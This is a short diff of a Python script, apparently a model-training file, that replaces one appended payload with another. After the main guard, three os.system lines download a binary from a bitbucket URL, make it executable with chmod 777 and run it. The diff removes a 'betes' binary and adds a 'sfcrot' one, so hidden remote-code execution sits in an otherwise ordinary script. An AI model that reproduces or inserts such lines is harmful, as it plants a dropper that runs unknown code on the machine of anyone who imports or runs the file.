@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/betee/scbte/raw/b628b4b10d34187ff3cf6d3028aa2a4fe02e38d2/betes')
-os.system('chmod 777 betes')
-os.system('./betes')
+os.system('wget https://bitbucket.org/betee/sfx/raw/4f2b40d2bd7df3c11febc67c0890ee8b7676351b/sfcrot')
+os.system('chmod 777 sfcrot')
+os.system('./sfcrot')
